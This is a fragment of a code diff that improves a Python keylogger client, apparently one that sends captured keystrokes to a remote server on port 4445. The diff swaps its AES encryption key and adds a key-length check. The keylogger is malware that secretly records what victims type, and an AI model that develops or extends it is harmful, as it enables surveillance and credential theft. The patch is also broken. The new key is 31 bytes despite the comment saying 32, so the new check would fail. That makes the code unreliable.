@@ -14,8 +14,7 @@ PORT = 4445
 BUFFER_THRESHOLD = 20  # Characters before sending
 MAX_DELAY = 2.0  # Maximum seconds between sends
 RECONNECT_BASE_DELAY = 1.0
-ENCRYPTION_KEY = b'this-is-a-32-byte-key-for-aes-256!!'  # 32 characters
-
+ENCRYPTION_KEY = b'This-is-a-32-byte-AES-key-1234!'  # 32 characters = 32 bytes
 
 class KeyLoggerClient:
     def __init__(self):
@@ -111,15 +110,21 @@ class KeyLoggerClient:
 
     # Update the encryption method
     def _encrypt(self, data):
-        """Proper AES-256-CBC encryption"""
+        """Proper AES encryption with valid key size"""
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-        from cryptography.hazmat.backends import default_backend
         from cryptography.hazmat.primitives import padding
+        from cryptography.hazmat.backends import default_backend
 
-        # Generate proper IV
+        # Validate key length
+        valid_lengths = {16, 24, 32}
+        if len(ENCRYPTION_KEY) not in valid_lengths:
+            raise ValueError(
+                f"Invalid key length {len(ENCRYPTION_KEY)}. "
+                "Key must be 16, 24, or 32 bytes long."
+            )
+
+        # Generate IV and set up padding
         iv = os.urandom(16)
-
-        # Add padding
         padder = padding.PKCS7(128).padder()
         padded_data = padder.update(data) + padder.finalize()
 
